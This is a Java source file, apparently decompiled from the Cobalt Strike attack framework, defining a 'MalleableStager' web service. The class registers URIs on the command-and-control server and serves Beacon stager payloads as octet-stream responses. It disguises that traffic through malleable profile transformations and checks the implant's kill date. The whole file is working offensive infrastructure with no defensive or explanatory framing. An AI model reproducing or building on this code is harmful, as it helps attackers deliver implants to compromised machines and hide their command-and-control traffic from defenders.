package c2profile;

import cloudstrike.Response;
import cloudstrike.WebServer;
import cloudstrike.WebService;
import common.CommonUtils;
import java.io.ByteArrayInputStream;
import java.util.LinkedList;
import java.util.List;
import java.util.Properties;

public class MalleableStager implements WebService {
   protected Profile profile;
   protected byte[] resource;
   protected String key;
   protected String arch;
   protected String ex_uri = null;

   public MalleableStager(Profile var1, String var2, byte[] var3, String var4) {
      this.resource = var3;
      this.profile = var1;
      this.key = var2;
      this.arch = var4;
   }

   public void setup(WebServer var1, String var2) {
      var1.register(var2, this);
      if (this.profile.hasString(this.key + ".uri_" + this.arch)) {
         this.ex_uri = this.profile.getString(this.key + ".uri_" + this.arch);
         var1.registerSecondary(this.ex_uri, this);
      }

      this.checkKillDate();
   }

   public void checkKillDate() {
      if (this.profile.hasString(".killdate")) {
         long var1 = CommonUtils.parseDate(this.profile.getString(".killdate"), "yyyy-MM-dd");
         if (var1 < System.currentTimeMillis()) {
            CommonUtils.print_warn("Beacon kill date " + this.profile.getString(".killdate") + " is in the past!");
         }
      }

   }

   public Response serve(String var1, String var2, Properties var3, Properties var4) {
      Response var5 = null;
      if (this.ex_uri != null && var1.equals(this.ex_uri)) {
         var5 = new Response("200 OK", "application/octet-stream", new ByteArrayInputStream(this.resource), (long)this.resource.length);
         if (this.profile.hasString(this.key + ".server")) {
            this.profile.apply(this.key + ".server", var5, this.resource);
         }
      } else {
         var5 = new Response("200 OK", "application/octet-stream", new ByteArrayInputStream(new byte[0]), 0L);
         if (this.profile.hasString(this.key + ".server")) {
            this.profile.apply(this.key + ".server", var5, this.resource);
         }

         var5.data = new ByteArrayInputStream(this.resource);
         var5.size = (long)this.resource.length;
         var5.offset = 0L;
         var5.addHeader("Content-Length", this.resource.length + "");
      }

      this.checkKillDate();
      return var5;
   }

   public String toString() {
      return "beacon stager " + this.arch;
   }

   public String getType() {
      return "beacon";
   }

   public List cleanupJobs() {
      return new LinkedList();
   }

   public boolean suppressEvent(String var1) {
      return false;
   }

   public boolean isFuzzy() {
      return false;
   }
}
